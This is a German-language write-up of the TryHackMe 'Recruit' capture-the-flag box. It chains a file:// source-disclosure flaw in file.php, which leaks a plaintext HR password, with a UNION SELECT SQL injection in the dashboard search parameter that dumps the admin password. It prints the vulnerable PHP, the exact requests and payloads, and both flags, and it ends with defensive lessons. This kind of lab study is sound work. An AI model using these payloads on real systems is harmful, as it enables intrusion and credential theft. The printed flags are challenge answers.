# Recruit Hunt – Reference

TryHackMe Box: `Recruit`
Ziel-URL beim Lösen: `http://10.113.187.4/`
Solver-Skript: [recruit_vuln.py](recruit_vuln.py)

## Flags

| Rolle | Flag |
|-------|------|
| Normal User (HR) | `THM{LOGGED_IN_USER}` |
| Admin | `THM{LOGGED_IN_ADM1N1}` |

## Zusammenfassung des Angriffs

Zwei verkettete Schwachstellen:

1. **SSRF / LFI** in `/file.php?cv=<URL>` – das Script erlaubt zwar nur `file://`, der `realpath`-Check beschränkt aber nur auf `/var/www/html`. Das reicht, um den Quellcode der Anwendung zu lesen.
2. **SQL Injection** im `search`-Parameter auf `dashboard.php` – die Query wird unescaped in `WHERE name LIKE '%$search%'` interpoliert. Mit einer `UNION SELECT` aus `users` lässt sich das Admin-Passwort dumpen.

## Schritt-für-Schritt-Walkthrough

### 1) Recon

Sichtbare Endpoints: `/`, `/dashboard.php`, `/api.php`, `/file.php`, `/logout.php`.
`api.php` dokumentiert: `GET /file.php?cv=<URL>`.

Die `/`-Seite enthält direkt das Login-Formular (kein eigenes `/login.php`):

```html
<form method="POST">
  <input type="text" name="username" ...>
  <input type="password" name="password" ...>
  <button name="login">Login</button>
</form>
```

### 2) SSRF gegen file.php zum Quellcode-Leak

`file.php` filtert nur das Schema:

```php
if (strpos($cv, 'file://') !== 0) { die('Only local files are allowed'); }
$realPath = realpath(str_replace('file://', '', $cv));
if (strpos($realPath, '/var/www/html') !== 0) { die('Access denied'); }
echo file_get_contents($realPath);
```

Lesbar damit: alle Dateien unter `/var/www/html`. Wichtige Funde:

```
GET /file.php?cv=file:///var/www/html/config.php
GET /file.php?cv=file:///var/www/html/index.php
GET /file.php?cv=file:///var/www/html/dashboard.php
```

`config.php` enthält:

```php
$HR_PASSWORD = 'hrpassword123';
```

### 3) HR-Login → User-Flag

Login auf `/`:

```
POST /
username=hr&password=hrpassword123&login=Login
```

Nach erfolgreichem Login zeigt `dashboard.php` die HR-Flag-Karte:

```
THM{LOGGED_IN_USER}
```

`dashboard.php` setzt `$_SESSION['role']`-abhängig den Flag-Pfad:

```php
if ($_SESSION['role'] === 'hr')    { $flagPath = '/user.txt'; }
elseif ($_SESSION['role'] === 'admin') { $flagPath = '/admin.txt'; }
```

### 4) SQLi im `search`-Parameter → Admin-Passwort

Verwundbarer Code in `dashboard.php`:

```php
$search = $_GET['search'];
$query  = "SELECT * FROM candidates WHERE name LIKE '%$search%'";
```

Die Tabelle hat 4 sichtbare Spalten (`id`, `name`, `position`, `status`). `ORDER BY 4` funktioniert, `ORDER BY 5` wirft `Unknown column '5'` → exakt 4 Spalten.

Eingesetzter Payload als HR (Session-Cookie nötig):

```
GET /dashboard.php?search=' UNION SELECT 1,username,password,4 FROM users -- -
```

Im Tabellen-Body erscheint zusätzlich zu den Kandidaten:

```
| 1 | admin | admin@001admin | 4 |
```

### 5) Admin-Login → Admin-Flag

```
POST /
username=admin&password=admin@001admin&login=Login
```

`dashboard.php` zeigt jetzt die ADMIN-Flag-Karte mit den Approve/Reject-Buttons:

```
THM{LOGGED_IN_ADM1N1}
```

## Solver benutzen

Voraussetzungen: Python venv in `d:/projects/tryhackme/.venv` mit `requests`.

```bash
d:/projects/tryhackme/.venv/Scripts/python.exe \
  d:/projects/tryhackme/recruit_hunt/recruit_vuln.py \
  --target http://10.113.187.4
```

Der Solver gibt am Ende beide Flags aus.

## Lessons Learned / Defense

- `file://` als erlaubtes Schema reicht für Source-Disclosure aus, sobald das Web-Root les-/auslieferbar ist. Whitelist sollte konkrete Dateinamen erlauben oder besser ganz auf `http(s)://`-Quellen über einen Allowlist-Proxy beschränkt werden.
- Klartext-Vergleich gegen `users.password` + String-Interpolation in SQL = klassischer Doppelfehler. Prepared Statements für ALLE Queries (auch Such-Filter) und gehashte Passwörter (`password_hash` / `password_verify`).
- Geheimnisse wie `$HR_PASSWORD` gehören nicht in `config.php` neben dem Web-Root.
